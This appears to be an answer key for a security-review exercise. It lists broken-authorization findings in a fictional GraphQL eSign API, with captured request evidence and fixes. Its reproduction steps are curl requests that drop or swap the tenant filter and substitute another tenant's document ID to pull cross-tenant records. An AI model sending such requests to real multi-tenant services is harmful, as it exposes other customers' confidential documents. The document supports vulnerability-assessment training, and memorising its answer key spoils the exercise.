# Expected Response

## System
- Domain: Document Signing / eSign
- System: SignFlow eSign Platform
- Example ID: GQL-0047

## Priority Findings

### Finding 1: BOLA via Bulk/List Endpoint — listResources Returns All Objects When tenantId Filter Omitted or Caller-Supplied (Pattern 1.3)
**Severity:** Critical
**Category:** BOLA / Bulk List Endpoint

**Summary:**
The `listResources` query on `POST /graphql` returns all objects when `tenantId` is either omitted or supplied by the client. Per §5.0: "The `listResources` resolver returns all objects when the `tenantId` filter is omitted or when it is supplied from the client without JWT-level validation." Separately, the `getResource` resolver also lacks ownership checks — a single `resourceId` substitution returns eSign document records belonging to another tenant. The HAR demonstrates the direct ID substitution variant: `getResource(id: "R-2047")` returns document signing data belonging to `tenant-1095` to an attacker from `tenant-3cd7`.

**Evidence from HAR:**
- Request: `POST https://api.signflow-esign-platf.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-3cd7` — attacker's identity
- Query payload: `getResource(id: "R-2047") { resourceId tenantId ownerId data { sensitiveField internalNotes } }` — victim's document record ID substituted
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-1095` — cross-tenant eSign document returned
- Response `ownerId`: `other-user-3cd71095`
- Response `sensitiveField`: `CONFIDENTIAL-3cd71095`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-3cd71095`

**Root Cause (§4.0 RISK-GQL-047 + §5.0):** "The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." `listResources` also accepts a client-supplied `tenantId` filter without JWT validation.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-047 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.3 | "`listResources` returns all objects when `tenantId` is omitted or client-supplied without JWT validation" |
| HAR entry | request.postData | `getResource(id: "R-2047")` from `tenant-3cd7` |
| HAR entry | response.content | `tenantId: "tenant-1095"`, `sensitiveField: "CONFIDENTIAL-3cd71095"` |

---

### Finding 2: Cross-Tenant Bulk Document Enumeration via bulkResourceLookup (Pattern 1.9)
**Severity:** High
**Root Cause (§4.0):** "`bulkResourceLookup` accepts an arbitrary array of IDs without per-ID ownership filtering."

---

## Steps to Reproduce

### Step 1 — Omit tenantId from listResources (all-tenant leak)
```bash
curl -s -X POST https://api.signflow-esign-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3cd7" \
  -d '{"query": "query { listResources { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns all eSign records across all tenants.
**Secure outcome:** Should return only `tenant-3cd7` records; empty `tenantId` should be rejected or defaulted to JWT's tenantId.

### Step 2 — Caller-supplied cross-tenant filter
```bash
curl -s -X POST https://api.signflow-esign-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3cd7" \
  -d '{"query": "query { listResources(tenantId: \"tenant-1095\") { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns `tenant-1095` document signing records.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden"}]}`.

### Step 3 — Direct ID substitution (HAR attack)
```bash
curl -s -X POST https://api.signflow-esign-platf.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-3cd7" \
  -d '{"query": "query VulnerableOp { getResource(id: \"R-2047\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-1095"`, `ownerId: "other-user-3cd71095"`, `sensitiveField: "CONFIDENTIAL-3cd71095"`.
**Secure outcome:** HTTP 403 or FORBIDDEN.

## Remediation
1. **Ignore caller-supplied tenantId in listResources:** Extract `tenantId` from JWT only.
2. **Reject listResources when tenantId omitted:** Default to JWT's `tenantId` or return empty list.
3. **Resolver tenant guard on getResource:** Apply `WHERE resource_id = $id AND tenant_id = $jwt.tenantId` (§4.0 RISK-GQL-047).
4. **Per-ID ownership filter in bulkResourceLookup.**
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only.
